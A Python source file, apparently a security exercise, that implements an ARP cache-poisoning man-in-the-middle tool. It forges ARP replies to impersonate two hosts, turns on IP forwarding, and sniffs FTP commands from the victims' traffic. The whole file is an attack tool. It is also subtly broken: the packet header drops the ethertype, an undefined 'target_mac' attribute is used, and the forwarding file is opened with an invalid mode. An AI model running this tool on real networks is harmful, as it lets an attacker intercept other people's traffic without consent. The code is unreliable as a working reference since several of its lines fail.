from netaddr import EUI, IPAddress
import socket
import struct
import pcap
import dpkt


class Inquisitor:
    usage = "./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>\n\n\
    - <IP-src> The IPv4 address of the machine to impersonate\n\
    - <MAC-src> The MAC address of the machine to impersonate\n\
    - <IP-target> The IPv4 address of the victim machine\n\
    - <MAC-target> The MAC address of the victim machine\n"

    def __init__(self, args):
        try:
            self.src_ip = IPAddress(args[0])
            self.src_mac = EUI(args[1])
            self.tg_ip = IPAddress(args[2])
            self.tg_mac = EUI(args[3])

            with open("/sys/class/net/eth0/address", "r") as f:
                my_mac = f.read().strip()
            self.my_mac = EUI(my_mac)

            if self.src_ip.version != 4 or self.tg_ip.version != 4:
                raise ValueError("Only Ipv4 is accepted\n")
        except Exception as e:
            print(str(e) + "\n" + self.usage)

    @staticmethod
    def _create_ARP_packet(sender_ip, sender_mac, target_ip, target_mac):
        """
        Return an ARP packet response
        """
        # ARP header = target_mac + sender_mac + ethernet_type (ARP)
        header = target_mac.packed + sender_mac.packed
        + struct.pack("!H", 0x0806)

        payload = struct.pack(
            "!HHBBH6s4s6s4s",
            1,                      # Hardware type (Ethernet)
            0x0800,                 # Protocol type (IPv4)
            6,                      # Hardware size
            4,                      # Protocol size
            2,                      # Opcode (2 = reply)
            sender_mac.packed,      # sender_mac
            sender_ip.packed,       # sender_ip
            target_mac.packed,      # target_mac
            target_ip.packed,       # target_ip
        )
        return header + payload

    def connect(self):
        """
        Enables IP route ( IP Forward ) in linux-based distro
        """
        with open("/proc/sys/net/ipv4/ip_forward", "rw") as f:
            if f.read() == 1:
                return
            f.write(1)

        # Convert ETHERTYPE_ARP to network byte order for the socket call
        ARP_PROTOCOL = socket.htons(socket.ETHERTYPE_ARP)
        # socket is a raw socket that will ONLY receive/send ARP packets
        self.socket = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            ARP_PROTOCOL)
        self.socket.bind(("eth0", 0))  # or try 'wlp5s0'

    def poison(self):
        """
        Send ARP response to src and target with attacker MAC
        """
        # Impersonating source to target
        packet = self._create_ARP_packet(
            self.src_ip,
            self.my_mac,
            self.tg_ip,
            self.target_mac)
        self.socket.send(packet)

        # Impersonating target to source
        packet = self._create_ARP_packet(
            self.tg_ip,
            self.my_mac,
            self.src_ip,
            self.src_mac)
        self.socket.send(packet)

    def intercept(self):
        """
        Intercept the packets and display file name
        """
        cap = pcap.pcap(name=None, promisc=True, immediate=True, timeout_ms=50)
        cap.setfilter('tcp port 21')  # FTP default port

        for timestamp, packet in cap:
            try:
                eth = dpkt.ethernet.Ethernet(packet)
                if (
                    isinstance(eth.data, dpkt.ip.IP)
                    and isinstance(eth.data.data, dpkt.tcp.TCP)
                ):
                    ip = eth.data
                    tcp = ip.data
                    data = tcp.data.decode(errors='ignore')
                    for line in data.splitlines():
                        if line.startswith(('RETR', 'STOR', 'LIST')):
                            print(f"{timestamp} - {line}")
            except Exception:
                continue

    def restore(self):
        """
        Send the ARP response with correct addresses to restore the ARP tables
        """
        # Restoring source to target
        packet = self._create_ARP_packet(
            self.src_ip,
            self.src_mac,
            self.tg_ip,
            self.target_mac)
        self.socket.send(packet)

        # Restoring target to source
        packet = self._create_ARP_packet(
            self.tg_ip,
            self.tg_mac,
            self.src_ip,
            self.src_mac)
        self.socket.send(packet)

        # Close the socket if it exists
        self.socket and self.socket.close()

    def __str__(self):
        return (f"Inquisitor:\n"
                f"  - Attacker:   {str(self.my_mac)}\n"
                f"  - Source: {str(self.src_ip)}  | {str(self.src_mac)}\n"
                f"  - Victim:   {str(self.tg_ip)}  | {str(self.tg_mac)}\n")
